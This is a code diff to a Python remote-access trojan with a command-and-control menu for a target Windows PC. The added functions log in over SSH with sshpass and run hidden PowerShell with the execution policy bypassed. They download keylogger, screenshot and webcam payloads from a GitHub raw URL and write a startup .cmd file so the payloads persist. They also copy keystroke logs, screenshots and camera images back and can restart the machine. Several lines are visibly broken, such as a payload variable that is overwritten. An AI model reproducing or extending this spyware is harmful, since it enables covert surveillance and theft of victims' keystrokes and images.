@@ -17,28 +17,25 @@ help_menu = """
         [+] Arguments:
             <username>.rat ------------ Access Target Via Config File
             -d, --dfig <vps_user> ----- Download RAT Config File 
-            -s, --start --------------- Start Tool
-            -m, --man ----------------- OnlyRAT Manual
-            -v, --version ------------- OnlyRAT Version
-            -u, --update -------------- Update OnlyRAT
-            -r, --remove -------------- Uninstall OnlyRAT
+            -u, --update -------------- Update RAT
+            -r, --remove -------------- Uninstall RAT
             -h, --help  --------------- Help Menu
 
         [+] Example:
-            onlyrat bluecosmo.rat
+            main.py bluecosmo.rat
 """
 
 options_menu = """
  [+] Command and Control:
             [0] -------------- Connect Command Line 
-            [1] ---------- Install Keylogger
-            [2] ----------------- Take File KeyLogger
-            [3] --------------- Install ScreenShot (.jpg)
-            [4] --- Take image 
-            [5] -- Sets Connection to Remote
-            [6] ---------------- Restart Target PC
-            [7] --------------- Shutdown Target PC
-            [8] ------------- Removes OnlyRAT From Target
+            [1] ---------- Install Payloads to Target (Keylogger, Screenshot, Camera)
+            [2] ----------------- Run KeyLogger
+            [3] --------------- Take file Keylogger (.log)
+            [4] --- Run Screenshot
+            [5] -- Take file screenshot (.png)
+            [6] ---------------- Run Camera
+            [7] --------------- Take picture (.bmp)
+            [8] ------------- Restart PC target
 
         [+] Payloads:
             Coming Soon...
@@ -64,20 +61,49 @@ header = f"[~] {username}@toolhacking $:"
 def run_command(address, username, password, command):
     os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '{command}'")
     
-def keylogger(address, username, password, temp, startup):
-    print("[*] Starting install keylogger ...")
-    control = f"powershell -c powershell.exe -WindowStyle hidden 'Invoke-WebRequest -Uri  -OutFile {startup}/system.cmd'"
-    payload = f"powershell -c powershell.exe -WindowStyle hidden 'Invoke-WebRequest -Uri  -OutFile {temp}/system.ps1'"
+def payloads(address, username, password, temp):
+    print("[*] Starting install payloads ...")
+    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/keylogger.ps1' -OutFile '{temp}\happy\system.ps1'\""
+    payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/screenshot.ps1' -OutFile '{temp}\happy\system32.ps1'\""
+    payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/key_logger/payloads/CommandCam.exe' -OutFile '{temp}\happy\system.exe'\""
+    run_command(address, username, password, temp)
+    print("[+] Install Successful ...")
 
-    print("[*] Installing control keylogger")
+
+def run_control_keylogger(address, username, password, temp, startup):
+    print("[*] Starting run control keylogger ...")
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system.ps1' > system.cmd"
     run_command(address, username, password, control)
-    print("[*] Installing keylogger")
-    run_command(address, username, password, payload)
-    print("[*] Install successful : Let restart device to run keylogger !!!")
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
+    run_command(address, username, password, run_control)
+    print("[+] Keylogger running ...")
 
 def take_file_log(address, username, password, path):
-    os.system(f"sshpass -p \"{password}\" scp {username}.rat {username}@{address}:{path}")
+    # file output *.log
+    os.system(f"sshpass -p \"{password}\" scp {username}.log {username}@{address}:{path}/sad")
+    
+def screenshot(address, username, password, temp, startup):
+    print("[*] Starting run control screenshot ...")
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system32.ps1' > system.cmd"
+    run_command(address, username, password, control)
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
+    run_command(address, username, password, run_control)
+    print("[+] Screenshot running ...")
+    
+def take_screenshot(address, username, password, path):
+    os.system(f"sshpass -p \"{password}\" scp happy.png {username}@{address}:{path}/sad")
 
+def control_camera(address, username, password, temp, startup):
+    print("[*] Starting control camera ...")
+    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}\happy\system.exe' > system.cmd"
+    run_command(address, username, password, control)
+    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
+    run_command(address, username, password, run_control)
+    print("[+] Started camera . . .")
+
+def take_camera_picture(address, username, password, path):
+    os.system(f"sshpass -p \"{password}\" scp image.bmp {username}@{address}:{path}/happy")
+    
 def terminated():
     return
 
@@ -100,6 +126,9 @@ def os_detection(address, username, password):
 def connect(address, username, password):
     os.system(f"sshpass -p \"{password}\" ssh {username}@{address}")
     
+def restart_pc(address, username, password):
+    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} 'shutdown /r'")
+    
 
 def cli(args): 
     print(banner)
@@ -115,14 +144,26 @@ def cli(args):
             options = input(f"{header}")
             if options == "help":
                 print(help_menu)
-            elif options == "exit":
+            elif options == "quit":
                 terminated()
             elif options == "0":
                 connect(IPADDRESS, USERNAME, PASSWORD)
             elif options == "1":
-                keylogger(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
-            elif options == "2":
+                payloads(IPADDRESS, USERNAME, PASSWORD, TEMP)
+            elif options == '2':
+                run_control_keylogger(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
+            elif options == "3":
                 take_file_log(IPADDRESS, USERNAME,PASSWORD, TEMP)
+            elif options == "4":
+                screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
+            elif options == "5":
+                take_screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP)
+            elif options == "6":
+                control_camera(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
+            elif options == "7":
+                take_camera_picture(IPADDRESS, USERNAME, PASSWORD, TEMP)
+            elif options == "8":
+                restart_pc(IPADDRESS, USERNAME, PASSWORD)
     elif args in ["-h", "-help"]:
         print(help_menu)
         
